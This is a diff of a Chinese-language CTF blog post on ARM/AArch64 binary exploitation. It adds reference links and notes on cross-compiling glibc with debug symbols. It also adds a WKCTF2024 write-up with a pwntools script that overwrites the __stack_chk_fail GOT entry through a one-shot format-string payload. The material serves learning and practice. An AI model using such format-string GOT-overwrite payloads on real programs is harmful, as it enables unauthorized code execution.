@@ -70,8 +70,9 @@
   <main class="post-content"><p>一些师傅的博客：</p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com)</a></p>
 <p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/#arm-pwn%E5%9F%BA%E6%9C%AC%E6%8A%80%E8%83%BD">arm pwn 入门 | blingbling’s blog (blingblingxuanxuan.github.io)</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">关于学习arm架构下的pwn的总结 - ZikH26 - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://sky123.blog.csdn.net/article/details/135730371?spm=1001.2014.3001.5502">IOT pwn_apt install mips-linux-CSDN博客</a></p>
 <p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">[原创] CTF 中 ARM &amp; AArch64 架构下的 Pwn-Pwn-看雪-安全社区|安全招聘|kanxue.com</a> </p>
+<p>也参考了许多其他师傅们的博客，这里不一一贴出来了。</p>
 <h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><p>- <a href="#arm_reg">ARM寄存器集</a></p>
 <p>- <a href="#arm_code">ARM指令集</a></p>
 <p>- <a href="#env">ARM PWN环境搭建</a></p>
@@ -83,7 +84,11 @@
 <li><a href="#second">题目二：32位 arm架构 动态</a></li>
 <li><a href="#third">题目三：64位 aarch64架构 动态</a></li>
 <li><a href="#fourth">题目四：32位 arm ret2libc</a></li>
-<li><a href="#obn">题目五：aarch64架构 off by null</a></li>
+<li><a href="#obn">题目五：aarch64架构 off by null</a><ul>
+<li><a href="#loc">本地交叉编译</a></li>
+</ul>
+</li>
+<li><a href="#fmt">题目六：aarch64架构 格式化字符串</a></li>
 </ul>
 <h1 id="ARM寄存器集"><a href="#ARM寄存器集" class="headerlink" title="ARM寄存器集"></a>ARM寄存器集<a id="arm_reg"></a></h1><p>ARM指令集体系结构属于RISC（精简指令集） 32位 寄存器-寄存器型的体系结构，使用load&#x2F;stort指令在存储器与寄存器之间移动数据</p>
 <p>具有规整的32位指令格式，不能够像Pentium那样的CISC处理器将地址以及16位或者32位数据加载到寄存器中。</p>
@@ -411,10 +416,11 @@ io.interactive()</code></pre>
 <li>然后用IDA打开libc.so，使用Rizzo导出为libc.so.riz</li>
 <li>打开目标程序，使用Rizzo加载.riz</li>
 </ol>
-<p>但是本地没加载出来   ~__~   </p>
+<p>但是本地没加载出来   ~_~   </p>
 <p>需要知道编译的libc版本才能修复，网上找的libc是<a target="_blank" rel="noopener" href="https://launchpad.net/ubuntu/bionic/arm64/libc6/2.27-3ubuntu1">2.27-3ubuntu1 : libc6 : arm64 : Bionic (18.04) : Ubuntu (launchpad.net)</a>，可能是libc找错了</p>
 <p>尝试用了阿里公开的<a target="_blank" rel="noopener" href="https://github.com/aliyunav/Finger">finger</a>函数识别插件分析，貌似arm架构的函数识别不出来。。。</p>
 <p>也试了下<a target="_blank" rel="noopener" href="https://github.com/push0ebp/sig-database">sig-database</a>里面提供的sig文件，利用ida自带的FLIRT进行签名，2.23到2.27都试了一通，只匹配出来三个函数，2.28+作者没有构建arm架构的sig文件了。</p>
+<p>很是让人郁闷，不过学习了很多恢复符号表的方法。^-^</p>
 <h1 id="题目二：32位-arm架构-动态"><a href="#题目二：32位-arm架构-动态" class="headerlink" title="题目二：32位 arm架构 动态"></a>题目二：32位 arm架构 动态<a id="second"></a></h1><p>InCTF-2018 wARMup</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121507370.png" alt="image-20240712150714341"></p>
 <p>没开pie   32位arm架构bss段可执行</p>
@@ -454,6 +460,9 @@ io.interactive()</code></pre>
 
 <p>不过<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16077191.html">ZIKH26</a>师傅的payload有些理不清</p>
 <h1 id="题目三：64位-aarch64架构-动态"><a href="#题目三：64位-aarch64架构-动态" class="headerlink" title="题目三：64位 aarch64架构 动态"></a>题目三：64位 aarch64架构 动态<a id="third"></a></h1><p>上海骇极杯 2018 baby_arm</p>
+<blockquote>
+<p>sky123师傅写了，可以修改pwndbg&#x2F;lib&#x2F;regs.py中的寄存器的定义名，这样pwndbg就能显示出$31$30等寄存器名称</p>
+</blockquote>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121840669.png" alt="image-20240712184024595"></p>
 <p>往bss段上写数据，然后存在栈溢出</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407121841597.png" alt="image-20240712184140558"></p>
@@ -734,9 +743,7 @@ io.interactive()</code></pre>
 <p>去了符号表 </p>
 <p>edit函数中存在off by null漏洞</p>
 <p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407131528523.png" alt="image-20240713152844453"></p>
-<p><strong>本地交叉编译</strong></p>
-<p>异架构对于堆来说有些不太友好，题目只给了一个libc文件，如果是x86系列，能直接从网上下载deb文件加压到libc同级的.debug文件夹下，调试时就能自动加载符号。但是arm架构不能如此，像<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">winmt</a>说的，网上下载arm对应的带符号的deb包后，在gdb中用add-symbol-file手动加载</p>
-<p>自行编译：</p>
+<h2 id="本地交叉编译"><a href="#本地交叉编译" class="headerlink" title="本地交叉编译"></a><strong>本地交叉编译</strong><a id="loc"></a></h2><p>异架构对于堆来说有些不太友好，题目只给了一个libc文件，如果是x86系列，能直接从网上下载deb文件加压到libc同级的.debug文件夹下，设置debug-file-directory为.debug文件夹，调试时就能自动加载符号。但是arm架构不能如此，参考<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm#msg_header_h2_1">winmt</a>本地自行编译：</p>
 <pre><code class="highlight plaintext">tar -xvf ./glibc-2.27.tar.xz
 mkdir aarch64
 mkdir build
@@ -753,6 +760,56 @@ CXXFLAGS=&quot;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&quot; \
 make
 make install</code></pre>
 
+<p>然后在题目目录下：ln -s &#x2F;ctf&#x2F;work&#x2F;archs&#x2F;arm64&#x2F;2.27&#x2F;glibc-2.27&#x2F;aarch64&#x2F;lib .&#x2F;</p>
+<p>调试时能加载符号信息</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142046659.png" alt="image-20240714204402367"></p>
+<p>可惜pwngdb里面的命令会报错 或是不正确反映，以后看看能不能搞搞这个（搁着先）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407142103556.png" alt="image-20240714210328489"></p>
+<h1 id="题目六：aarch64架构-格式化字符串"><a href="#题目六：aarch64架构-格式化字符串" class="headerlink" title="题目六：aarch64架构 格式化字符串"></a>题目六：aarch64架构 格式化字符串<a id="fmt"></a></h1><p>WKCTF2024  something_changed  </p>
+<p>漏洞还是很简单，存在栈溢出和格式化字符串漏洞</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141932654.png" alt="image-20240714193242494"></p>
+<p>主要说一些比赛时候的思路：</p>
+<blockquote>
+<p>通过不断测试远程printf来泄露栈地址 –&gt; 发现泄露出来的地址固定不变  –&gt; 猜测是用qemu起的环境  –&gt; ret2shellcode备着   不过每次连接canary的值会变</p>
+<p>qemu起的程序相当于保护全关 而且这道题本身就没开FULL RELRO和pie。还给了backdoor  –&gt; 优先 一次性改好 再是改printf二次利用</p>
+</blockquote>
+<p>直接用一次性格式化字符串来改__stack_chk_fail_got为backdoor就行了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141946475.png" alt="27275487-64e1-4985-9147-f9d421f1d03d"></p>
+<pre><code class="highlight python"><span class="comment"># coding = utf-8</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+<span class="keyword">from</span> tw11ty <span class="keyword">import</span> *
+<span class="comment">#from ctypes import *</span>
+
+<span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span> :
+    <span class="comment"># context.log_level = &#x27;info&#x27;</span>
+    context.arch = <span class="string">&#x27;aarch64&#x27;</span>
+    IPort = <span class="string">&#x27;1 1&#x27;</span>
+    <span class="comment"># IPort = &#x27;127.0.0.1 12345&#x27;</span>
+    pwnfile = <span class="string">&#x27;./silent&#x27;</span>
+    libc_name = <span class="string">&#x27;./lib/libc.so.6&#x27;</span>
+    elf  = ELF(pwnfile)
+    libc = ELF(libc_name)
+
+    io = initc(pwnfile, IPort, <span class="string">&#x27;qemu-aarch64 -L ./ -g 12345 ./silent&#x27;</span>)
+    <span class="comment"># dbg(&quot;b *0x04007F4 \n b *0x000400854&quot;)</span>
+    <span class="comment"># dbg(&quot;b *0x000400854&quot;)</span>
+
+    scf = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]   <span class="comment">#14</span>
+    backdoor = <span class="number">0x00400770</span>
+    payload =  <span class="string">b&#x27;%1883c%c&#x27;</span> + <span class="string">b&#x27;%0c%0c%0c%0c%0c%0c%0c%c%c%c%c%c%c%c%c%c%c%caa%hn&#x27;</span>  + p64(scf)
+    sl(payload)
+    itr()
+<span class="comment">#canary   %19$p</span></code></pre>
+
+
+
+<p>杂七杂八</p>
+<p>printf前</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947979.png" alt="image-20240714194505752"></p>
+<p>printf后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/tw11ty/MyPic/img202407141947663.png" alt="image-20240714194737601"></p>
+<p>可以发现从 x1开始打印，到x7，然后开始打印栈上的数据</p>
+<p>printf的源码有空再看咯，先贴一位师傅的博客<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/#%E5%8D%95%E6%AC%A1-printf-%E5%88%A9%E7%94%A8">格式化字符串漏洞利用 - WJH’s Blog (wjhwjhn.com)</a>，原理就在这里。</p>
 </main>
 
 </article>
